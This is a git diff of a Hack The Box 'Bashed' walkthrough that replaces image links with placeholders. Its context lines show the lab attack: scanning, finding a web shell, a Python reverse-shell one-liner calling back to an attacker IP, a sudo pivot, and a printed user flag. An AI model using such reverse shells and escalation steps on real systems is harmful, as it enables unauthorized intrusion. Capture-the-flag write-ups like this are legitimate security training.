@@ -13,7 +13,7 @@ Bashed is an easy-rated Linux machine from Hack The Box that focuses on web appl
 export target=10.129.15.19
 ```
 
-<img width="281" height="63" alt="image" src="https://github.com/user-attachments/assets/6d939a2a-22e5-4262-9e88-475733024e87" />
+<img width="281" height="63" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
 
 ### Network Scanning
@@ -23,7 +23,7 @@ export target=10.129.15.19
 sudo nmap -p- --min-rate 5000 -sT -vvv $target
 ```
 
-<img width="733" height="207" alt="image" src="https://github.com/user-attachments/assets/d1d0085a-4ee7-40c5-928a-b1f6b5871317" />
+<img width="733" height="207" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
 **Results:**
 - Port 80/tcp open - HTTP service
@@ -33,7 +33,7 @@ sudo nmap -p- --min-rate 5000 -sT -vvv $target
 sudo nmap -sC -sV -p 80 -T4 $target
 ```
 
-<img width="760" height="254" alt="image" src="https://github.com/user-attachments/assets/4066b1a0-e573-4887-9c03-faba316f4efa" />
+<img width="760" height="254" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 **Detailed Results:**
 ```
@@ -50,7 +50,7 @@ PORT   STATE SERVICE VERSION
 ### Website Analysis
 Visiting `http://10.129.15.19` reveals a development website with limited functionality.
 
-<img width="952" height="987" alt="image" src="https://github.com/user-attachments/assets/74b3fd6c-f0a5-490d-b0b7-bf41cf2a2bc4" />
+<img width="952" height="987" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 ### Directory Brute Forcing
 ```bash
@@ -59,7 +59,7 @@ gobuster dir -u http://10.129.15.19 \
 -x php,txt,html -t 50 2>/dev/null
 ```
 
-<img width="962" height="612" alt="image" src="https://github.com/user-attachments/assets/2a3678df-53e3-4fbb-a0dd-ece55dc5ceb4" />
+<img width="962" height="612" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
 **Discovered Directories:**
 - `/dev/` - Development directory containing sensitive files
@@ -68,7 +68,7 @@ gobuster dir -u http://10.129.15.19 \
 Visiting `http://10.129.15.19/dev/` reveals two files:
 - `phpbash.php` - Web-based shell interface
 
-<img width="585" height="376" alt="image" src="https://github.com/user-attachments/assets/4c0b7ba9-3c1c-4f55-83ab-7a8e41f0b9d1" />
+<img width="585" height="376" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 ---
 
@@ -77,7 +77,7 @@ Visiting `http://10.129.15.19/dev/` reveals two files:
 ### Web Shell Exploitation
 Accessing `http://10.129.15.19/dev/phpbash.php` provides direct command execution capability.
 
-<img width="490" height="134" alt="image" src="https://github.com/user-attachments/assets/ee903e64-e9e0-4737-b473-391ce6e1f94e" />
+<img width="490" height="134" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
 ### Reverse Shell Establishment
 ```bash
@@ -88,7 +88,7 @@ nc -nlvp 4444
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.172",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
 ```
 
-<img width="1209" height="134" alt="image" src="https://github.com/user-attachments/assets/9ae570a2-acae-49e5-8181-19cfd6723a61" />
+<img width="1209" height="134" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
 ### Shell Stabilization
 ```bash
@@ -99,9 +99,9 @@ reset
 export TERM=xterm
 ```
 
-<img width="503" height="274" alt="image" src="https://github.com/user-attachments/assets/fd4a9faa-387a-4124-8a2f-6e7340b04522" />
+<img width="503" height="274" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
-<img width="600" height="423" alt="image" src="https://github.com/user-attachments/assets/e7525f2f-4be1-4278-854e-fe4b7dc40c5e" />
+<img width="600" height="423" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 ---
 
@@ -112,7 +112,7 @@ export TERM=xterm
 sudo -l
 ```
 
-<img width="777" height="171" alt="image" src="https://github.com/user-attachments/assets/39ee02b0-0391-406d-abb0-d8a5e07e0aaf" />
+<img width="777" height="171" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 **Output:**
 ```
@@ -124,7 +124,7 @@ User www-data may run the following commands on bashed:
 ```bash
 sudo -u scriptmanager bash
 ```
-<img width="593" height="425" alt="image" src="https://github.com/user-attachments/assets/382aaf20-0e61-472e-bbe6-efb38c480b2c" />
+<img width="593" height="425" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
 
 ### File System Discovery
@@ -151,7 +151,7 @@ f.close
 
 ### Process Monitoring with pspy
 
-<img width="595" height="164" alt="image" src="https://github.com/user-attachments/assets/c0e990ab-02fa-4b5e-882b-1dc20c19b5b4" />
+<img width="595" height="164" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 ```bash
 # Transfer pspy to target
@@ -160,7 +160,7 @@ chmod +x /tmp/pspy32
 ./pspy32
 ```
 
-<img width="878" height="75" alt="image" src="https://github.com/user-attachments/assets/771cc49a-22cd-4f74-8eb1-45f15da63791" />
+<img width="878" height="75" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
 **Critical Finding:**
 ```
@@ -204,7 +204,7 @@ cat /home/arrexel/user.txt
 cat /root/root.txt
 ```
 
-<img width="524" height="340" alt="image" src="https://github.com/user-attachments/assets/4a86320c-1662-4e8f-8cd8-f29e30c3a31f" />
+<img width="524" height="340" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />
 
 **Flags:**
 - **User Flag:** `b4c1d0d2f93c0b4000e10fcc01e04082`
